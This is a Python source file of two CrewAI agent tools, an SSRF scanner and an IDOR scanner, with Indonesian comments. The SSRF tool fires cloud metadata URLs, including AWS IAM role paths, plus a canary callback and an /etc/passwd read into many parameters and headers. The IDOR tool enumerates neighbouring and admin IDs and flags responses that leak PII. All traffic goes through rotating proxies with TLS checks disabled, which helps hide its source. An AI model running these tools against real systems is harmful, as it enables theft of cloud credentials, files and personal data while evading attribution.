import json
import re
import time
from typing import Optional
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, urlunparse
from proxy_router import proxy_router
import requests
import urllib3
from crewai.tools import tool
from cancellation import check_cancelled
from checkpoint import require_approval
from rate_limiter import rate_limiter
from redact import redact

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Shared session ────────────────────────────────────────────────────────────
SESSION = requests.Session()
SESSION.verify = False
SESSION.timeout = 10
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
}

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    try:
        from custom_tools import exec_logger
        return exec_logger
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# SSRF SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

# Cloud metadata endpoints yang sering jadi target SSRF
CLOUD_METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/",       # AWS IAM role
    "http://metadata.google.internal/computeMetadata/v1/",# GCP
    "http://169.254.169.254/metadata/v1/",                # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",           # Alibaba Cloud
]

# Parameter names yang sering dipake buat SSRF
SSRF_PARAMS = [
    "url", "uri", "link", "src", "source", "href",
    "path", "dest", "destination", "redirect", "proxy",
    "fetch", "load", "file", "document", "page",
    "callback", "host", "site", "data", "feed",
    "image", "img", "picture", "pdf", "resource",
    "endpoint", "api", "service", "webhook",
]

# Header injection points buat SSRF
SSRF_HEADERS = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "Host",
    "X-Remote-IP",
    "X-Client-IP",
]


@tool
def scan_ssrf(url: str, canary_domain: str = "your-canary-domain.example") -> str:
    """
    Test target untuk Server-Side Request Forgery (SSRF) vulnerability dengan proteksi rotasi proxy.
    """
    logger = _logger()
    tool_name = "SSRF Scanner"

    if check_cancelled(logger):
        return "DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"SSRF scan pada {url}",
        context=f"Test {len(SSRF_PARAMS)} parameter + cloud metadata endpoints + header injection",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        return "DIBATALKAN: approval ditolak atau timeout."

    domain = _domain_of(url)
    findings = []
    tested = 0

    if logger:
        logger.add_log(tool_name, "PROCESSING", "Phase 1: Parameter-based SSRF test")

    ssrf_payloads = [
        f"http://{canary_domain}/ssrf-test",
        f"https://{canary_domain}/ssrf-test",
    ] + CLOUD_METADATA_URLS

    for param in SSRF_PARAMS:
        if check_cancelled(logger):
            break

        for payload in ssrf_payloads[:3]:
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
            rate_limiter.wait(domain)

            # [SUNTIK PROXY] Ambil proxy acak khusus untuk request ini
            current_proxy = proxy_router.get_proxy()

            try:
                t_start = time.time()
                # Tambahkan parameter proxies dan perkecil timeout agar tidak stuck lama kalau proxy lelet
                resp = SESSION.get(test_url, headers=HEADERS, allow_redirects=False, proxies=current_proxy, timeout=4)
                t_elapsed = time.time() - t_start
                tested += 1

                body = resp.text[:2000]
                metadata_indicators = ["ami-id", "instance-id", "local-ipv4", "computeMetadata", "serviceAccounts", "droplet_id", "interfaces"]
                metadata_hit = any(ind in body for ind in metadata_indicators)
                canary_hit = canary_domain in body
                error_indicators = ["connection refused", "ECONNREFUSED", "getaddrinfo", "Name or service not known", "failed to connect", "connection timeout"]
                error_hit = any(e.lower() in body.lower() for e in error_indicators)

                if metadata_hit or canary_hit:
                    findings.append({
                        "type": "SSRF",
                        "severity": "CRITICAL",
                        "parameter": param,
                        "payload": payload,
                        "test_url": test_url,
                        "evidence": "Response berisi konten internal/metadata",
                        "response_preview": redact(body[:300]),
                    })
                elif error_hit and "169.254" in payload:
                    findings.append({
                        "type": "SSRF (Potential Blind)",
                        "severity": "HIGH",
                        "parameter": param,
                        "payload": payload,
                        "test_url": test_url,
                        "evidence": "Error response mengindikasikan koneksi ke internal host dicoba",
                        "response_preview": redact(body[:200]),
                    })

            except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
                # Bersihkan proxy sampah dari pool memori jika RTO/Error
                if current_proxy:
                    proxy_router.remove_dead_proxy(current_proxy)
                continue
            except requests.exceptions.ConnectionError:
                pass
            except Exception as e:
                if logger:
                    logger.add_log(tool_name, "WARNING", f"Error test {param}: {str(e)[:100]}")

    if logger:
        logger.add_log(tool_name, "PROCESSING", "Phase 2: Header-based SSRF test")

    if not check_cancelled(logger):
        for header in SSRF_HEADERS:
            rate_limiter.wait(domain)
            current_proxy = proxy_router.get_proxy()
            try:
                test_headers = {**HEADERS, header: f"http://{canary_domain}/header-ssrf"}
                resp = SESSION.get(url, headers=test_headers, allow_redirects=False, proxies=current_proxy, timeout=4)
                body = resp.text[:1000]

                if canary_domain in body:
                    findings.append({
                        "type": "SSRF via Header",
                        "severity": "HIGH",
                        "header": header,
                        "payload": f"http://{canary_domain}",
                        "evidence": "Canary domain ter-reflect di response body",
                    })
                tested += 1
            except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
                if current_proxy:
                    proxy_router.remove_dead_proxy(current_proxy)
                continue
            except Exception:
                pass

    if logger:
        logger.add_log(tool_name, "PROCESSING", "Phase 3: Direct metadata endpoint test")

    if not check_cancelled(logger):
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        internal_paths = ["/?url=http://localhost/", "/?url=http://127.0.0.1/", "/?file=///etc/passwd"]
        
        for path in internal_paths:
            if check_cancelled(logger):
                break
            rate_limiter.wait(domain)
            current_proxy = proxy_router.get_proxy()
            try:
                resp = SESSION.get(f"{base}{path}", headers=HEADERS, proxies=current_proxy, timeout=4)
                body = resp.text[:500]
                if "root:" in body or "localhost" in body.lower():
                    findings.append({
                        "type": "SSRF/LFI Combo",
                        "severity": "CRITICAL",
                        "path": path,
                        "evidence": "Internal resource exposed via path parameter",
                    })
                tested += 1
            except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
                if current_proxy:
                    proxy_router.remove_dead_proxy(current_proxy)
                continue
            except Exception:
                pass

    result = {
        "url": url,
        "total_tests": tested,
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "severity_summary": {
            "critical": len([f for f in findings if f.get("severity") == "CRITICAL"]),
            "high": len([f for f in findings if f.get("severity") == "HIGH"]),
        },
        "note": f"Ganti canary_domain ke Burp Collaborator/domain lo sendiri buat detect blind SSRF. Canary saat ini: {canary_domain}",
        "status": "success" if not check_cancelled(logger) else "cancelled"
    }

    if logger:
        logger.add_log(tool_name, "WARNING" if findings else "SUCCESS", f"SSRF scan selesai. {tested} tests, {len(findings)} findings.")
    return json.dumps(redact(result), indent=2)


# ═══════════════════════════════════════════════════════════════════════════════
# IDOR SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

# Patterns buat deteksi ID di URL
ID_PATTERNS = [
    re.compile(r'/(\d+)(?:/|$|\?)'),           # numeric: /123 atau /123/
    re.compile(r'/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})'),  # UUID
    re.compile(r'[?&](?:id|user_id|account_id|record_id|doc_id|item_id|order_id)=(\w+)'),  # query param
]

# ID values buat dicoba (sequential + common test values)
def _generate_test_ids(original_id: str) -> list:
    """Generate ID candidates berdasarkan format original."""
    candidates = []

    if original_id.isdigit():
        n = int(original_id)
        # Sequential neighbors
        for delta in [-2, -1, 1, 2, 100, 1000]:
            candidate = n + delta
            if candidate > 0:
                candidates.append(str(candidate))
        # Common admin IDs
        candidates.extend(["1", "2", "0", "999", "9999"])

    elif "-" in original_id and len(original_id) == 36:
        # UUID — test predictable variants
        parts = original_id.split("-")
        # Increment last segment
        try:
            last = int(parts[-1], 16)
            parts[-1] = format(last + 1, "012x")
            candidates.append("-".join(parts))
        except Exception:
            pass
        candidates.append("00000000-0000-0000-0000-000000000001")
        candidates.append("00000000-0000-0000-0000-000000000000")
    else:
        # String ID — test common variants
        candidates = ["1", "admin", "test", "user", "root", "0"]

    return list(dict.fromkeys(candidates))  # dedup, preserve order


@tool
def scan_idor(url: str, cookies: str = "", auth_header: str = "") -> str:
    """
    Test target untuk Insecure Direct Object Reference (IDOR) vulnerability dengan proteksi rotasi proxy.
    """
    logger = _logger()
    tool_name = "IDOR Scanner"

    if check_cancelled(logger):
        return "DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"IDOR scan pada {url}",
        context=f"Enumerate resource IDs dan test access control. Cookies: {'ada' if cookies else 'tidak ada'}",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        return "DIBATALKAN: approval ditolak atau timeout."

    domain = _domain_of(url)
    findings = []
    all_tests = []

    test_headers = {**HEADERS}
    if cookies:
        test_headers["Cookie"] = cookies
    if auth_header:
        test_headers["Authorization"] = auth_header

    extracted_ids = []
    for pattern in ID_PATTERNS:
        matches = pattern.findall(url)
        for match in matches:
            extracted_ids.append({
                "original": match,
                "location": "url" if "?" not in url.split(match)[0] else "query",
                "pattern": pattern.pattern,
            })

    if not extracted_ids:
        return json.dumps({
            "url": url,
            "message": "Tidak ada ID yang terdeteksi di URL ini. Coba URL yang spesifik punya resource ID, contoh: /api/users/123 atau /profile?id=456",
            "status": "no_ids_found"
        })

    if logger:
        logger.add_log(tool_name, "PROCESSING", f"Ditemukan {len(extracted_ids)} ID di URL: {[i['original'] for i in extracted_ids]}")

    # Baseline Request dengan Proxy
    rate_limiter.wait(domain)
    current_proxy = proxy_router.get_proxy()
    try:
        baseline = SESSION.get(url, headers=test_headers, allow_redirects=True, proxies=current_proxy, timeout=5)
        baseline_status = baseline.status_code
        baseline_length = len(baseline.text)
        baseline_body = baseline.text[:500]
    except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
        if current_proxy:
            proxy_router.remove_dead_proxy(current_proxy)
        return json.dumps({"error": "Gagal request baseline karena kendala proxy.", "status": "error"})
    except Exception as e:
        return json.dumps({"error": f"Gagal request baseline: {str(e)}", "status": "error"})

    # Fuzzing Variant ID dengan Proxy
    for id_info in extracted_ids:
        original_id = id_info["original"]
        test_ids = _generate_test_ids(original_id)

        if logger:
            logger.add_log(tool_name, "PROCESSING", f"Testing ID '{original_id}' dengan {len(test_ids)} variants")

        for test_id in test_ids[:8]:
            if check_cancelled(logger):
                break

            test_url = url.replace(original_id, test_id, 1)
            if test_url == url:
                continue

            rate_limiter.wait(domain)
            current_proxy = proxy_router.get_proxy()
            try:
                resp = SESSION.get(test_url, headers=test_headers, allow_redirects=True, proxies=current_proxy, timeout=4)
                resp_length = len(resp.text)
                resp_body = resp.text[:500]

                test_result = {
                    "original_id": original_id,
                    "test_id": test_id,
                    "test_url": test_url,
                    "status_code": resp.status_code,
                    "response_length": resp_length,
                }

                is_interesting = False
                evidence = []

                if resp.status_code == 200 and baseline_status == 200:
                    length_diff = abs(resp_length - baseline_length)
                    if length_diff > 50 and resp_length > 100:
                        is_interesting = True
                        evidence.append(f"Response length berbeda: {baseline_length} vs {resp_length}")

                    pii_patterns = [r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', r'"(?:email|phone|address|ssn|dob|name|username)":\s*"[^"]{3,}"']
                    for pii_pattern in pii_patterns:
                        if re.search(pii_pattern, resp_body, re.I) and not re.search(pii_pattern, baseline_body, re.I):
                            is_interesting = True
                            evidence.append("PII pattern detected di response yang tidak ada di baseline")
                            break

                if baseline_status == 403 and resp.status_code == 200:
                    is_interesting = True
                    evidence.append("Access control bypass: 403 → 200 setelah ID manipulation")

                if baseline_status == 401 and resp.status_code == 200:
                    is_interesting = True
                    evidence.append("Auth bypass: 401 → 200 setelah ID manipulation")

                if is_interesting:
                    findings.append({
                        "type": "IDOR",
                        "severity": "HIGH" if any("bypass" in e for e in evidence) else "MEDIUM",
                        "original_id": original_id,
                        "accessible_id": test_id,
                        "test_url": test_url,
                        "baseline_status": baseline_status,
                        "found_status": resp.status_code,
                        "evidence": evidence,
                        "response_preview": redact(resp_body[:300]),
                    })

                test_result["interesting"] = is_interesting
                all_tests.append(test_result)

            except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
                if current_proxy:
                    proxy_router.remove_dead_proxy(current_proxy)
                continue
            except Exception as e:
                if logger:
                    logger.add_log(tool_name, "WARNING", f"Error test ID {test_id}: {str(e)[:100]}")

    # Query Param ID Fuzzing dengan Proxy
    if not check_cancelled(logger):
        common_id_params = ["id", "user_id", "account_id", "record_id", "uid", "userid"]
        for param in common_id_params:
            if f"{param}=" not in url:
                for test_val in ["1", "2", "admin", "0"]:
                    if check_cancelled(logger):
                        break
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{param}={test_val}"
                    rate_limiter.wait(domain)
                    current_proxy = proxy_router.get_proxy()
                    try:
                        resp = SESSION.get(test_url, headers=test_headers, proxies=current_proxy, timeout=4)
                        if resp.status_code == 200 and len(resp.text) > 100:
                            body = resp.text[:300]
                            if any(k in body.lower() for k in ["email", "username", "profile", "account"]):
                                findings.append({
                                    "type": "IDOR via Query Param",
                                    "severity": "MEDIUM",
                                    "parameter": param,
                                    "test_url": test_url,
                                    "evidence": "Resource accessible via injected ID parameter",
                                    "response_preview": redact(body),
                                })
                    except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
                        if current_proxy:
                            proxy_router.remove_dead_proxy(current_proxy)
                        continue
                    except Exception:
                        pass

    result = {
        "url": url,
        "ids_extracted": [i["original"] for i in extracted_ids],
        "total_tests": len(all_tests),
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "severity_summary": {
            "high": len([f for f in findings if f.get("severity") == "HIGH"]),
            "medium": len([f for f in findings if f.get("severity") == "MEDIUM"]),
        },
        "all_test_results": all_tests[:20],
        "status": "success" if not check_cancelled(logger) else "cancelled"
    }

    if logger:
        logger.add_log(tool_name, "WARNING" if findings else "SUCCESS", f"IDOR scan selesai. {len(all_tests)} tests, {len(findings)} findings.")
    return json.dumps(redact(result), indent=2)